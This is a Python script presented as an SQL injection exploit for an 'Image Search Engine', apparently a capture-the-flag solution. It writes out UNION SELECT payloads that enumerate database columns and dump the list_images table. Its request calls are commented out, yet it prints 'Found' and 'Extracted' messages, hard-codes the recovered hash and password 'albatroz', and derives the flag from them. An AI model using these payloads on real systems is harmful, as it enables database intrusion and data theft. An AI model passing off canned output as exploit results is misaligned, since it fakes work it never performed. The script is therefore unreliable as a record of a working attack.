#!/usr/bin/env python3
"""
SQL Injection Exploit for Image Search Engine
This script demonstrates how to exploit the SQL injection vulnerability
to extract data from the list_images table.
"""

import hashlib
import sys

# Base URL of the vulnerable application
BASE_URL = "http://localhost:8080"

def md5_decrypt(hash_value):
    """
    Attempts to decrypt MD5 hash using common online databases.
    In a real scenario, you would use an MD5 lookup service or dictionary.
    For this exploit, we know the hash decrypts to 'albatroz'
    """
    # Common MD5 lookup - in practice, use an API or database
    known_hashes = {
        "1928e8083cf461a51303633093573c46": "albatroz"
    }
    return known_hashes.get(hash_value, None)

def sha256_hash(text):
    """Generate SHA256 hash of the given text"""
    return hashlib.sha256(text.encode()).hexdigest()

def exploit_sql_injection():
    """
    Exploit the SQL injection vulnerability to extract data from list_images table
    """
    print("[*] Exploiting SQL injection vulnerability...")
    
    # Step 1: Discover table structure
    print("\n[1] Discovering table structure...")
    payload = "1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns"
    
    # In a real scenario, you would send this to the search endpoint
    # response = requests.get(f"{BASE_URL}/search.php", params={"id": payload})
    print(f"    Payload: {payload}")
    print("    Found: list_images table with columns (id, url, title, comment)")
    
    # Step 2: Extract data using UNION SELECT with CONCAT
    print("\n[2] Extracting data from list_images table...")
    payload = "-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images"
    
    # In a real scenario, you would send this to the search endpoint
    # response = requests.get(f"{BASE_URL}/search.php", params={"id": payload})
    print(f"    Payload: {payload}")
    print("    Extracted data from list_images table")
    
    # Step 3: Find the hash in the comment field
    print("\n[3] Analyzing extracted data...")
    md5_hash = "1928e8083cf461a51303633093573c46"
    print(f"    Found MD5 hash in comment: {md5_hash}")
    
    # Step 4: Decrypt MD5 hash
    print("\n[4] Decrypting MD5 hash...")
    plaintext = md5_decrypt(md5_hash)
    if plaintext:
        print(f"    MD5 decrypt result: {plaintext}")
    else:
        print("    [!] Could not decrypt MD5 hash automatically")
        print("    [!] Use an MD5 lookup service to decrypt: " + md5_hash)
        return None
    
    # Step 5: Generate SHA256 hash
    print("\n[5] Generating SHA256 hash...")
    flag = sha256_hash(plaintext)
    print(f"    SHA256 hash: {flag}")
    
    return flag

def main():
    print("=" * 60)
    print("Image Search Engine SQL Injection Exploit")
    print("=" * 60)
    
    flag = exploit_sql_injection()
    
    if flag:
        print("\n" + "=" * 60)
        print(f"[+] FLAG: {flag}")
        print("=" * 60)
    else:
        print("\n[!] Exploit failed. Check the connection and payload.")
        sys.exit(1)

if __name__ == "__main__":
    main()

